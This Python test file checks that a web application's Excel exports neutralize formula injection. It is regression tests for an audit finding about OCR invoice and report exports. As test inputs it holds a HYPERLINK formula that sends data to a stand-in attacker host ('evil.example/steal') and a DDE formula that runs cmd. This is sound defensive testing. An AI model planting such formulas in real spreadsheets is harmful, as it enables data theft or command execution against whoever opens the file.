"""Regression tests for audit finding H6: user-controlled text must never become an Excel formula."""
import io
import uuid

import openpyxl
import pytest
from httpx import ASGITransport, AsyncClient

from app.core.database import engine
from app.db.seed import seed_database
from app.main import app
from app.services.excel_safety import neutralize_formula_injection

HYPERLINK = '=HYPERLINK("http://evil.example/steal","Bosing")'
DDE = "=cmd|' /C calc'!A0"


def _formula_cells(content: bytes):
    wb = openpyxl.load_workbook(io.BytesIO(content))
    return [c.value for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.data_type == "f"]


def test_helper_neutralizes_injected_formulas_but_keeps_generated_ones():
    wb = openpyxl.Workbook()
    ws = wb.active
    ws["A1"] = HYPERLINK
    ws["A2"] = DDE
    ws["A3"] = "=1+1"
    ws["B1"] = "=SUM(B2:B10)"
    ws["B2"] = "=AVERAGE(C2:C10)"

    neutralize_formula_injection(wb)

    assert [ws[c].data_type for c in ("A1", "A2", "A3")] == ["s", "s", "s"]
    assert ws["A1"].value == HYPERLINK  # text preserved, just not executable
    assert [ws[c].data_type for c in ("B1", "B2")] == ["f", "f"]


@pytest.fixture
async def client():
    await seed_database()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as c:
        yield c
    await engine.dispose()


@pytest.mark.asyncio
async def test_ocr_invoice_export_does_not_emit_injected_formulas(client):
    doc = {
        "doc_number": "EHF-1", "doc_date": "2025-04-03", "doc_type": "EHF",
        "supplier_name": HYPERLINK, "supplier_inn": "301234567",
        "line_items": [{"item_name": DDE, "quantity": "1", "price": "100", "total_amount": "112"}],
    }
    resp = await client.post("/api/v1/ocr/export-excel", json=doc)
    assert resp.status_code == 200, resp.text
    formulas = _formula_cells(resp.content)
    assert HYPERLINK not in formulas and DDE not in formulas


@pytest.mark.asyncio
async def test_report_export_does_not_emit_injected_formulas(client):
    created = await client.post("/api/v1/organizations", json={
        "name": HYPERLINK, "inn": f"{uuid.uuid4().int % 10**9:09d}", "mode": "BHMS", "vat_payer": True,
    })
    assert created.status_code == 200, created.text
    resp = await client.get("/api/v1/reports/export/xlsx", params={
        "report_type": "oborotka", "organization_id": created.json()["id"],
        "from_date": "2025-01-01", "to_date": "2025-12-31",
    })
    assert resp.status_code == 200, resp.text
    assert not any("HYPERLINK" in str(f) for f in _formula_cells(resp.content))
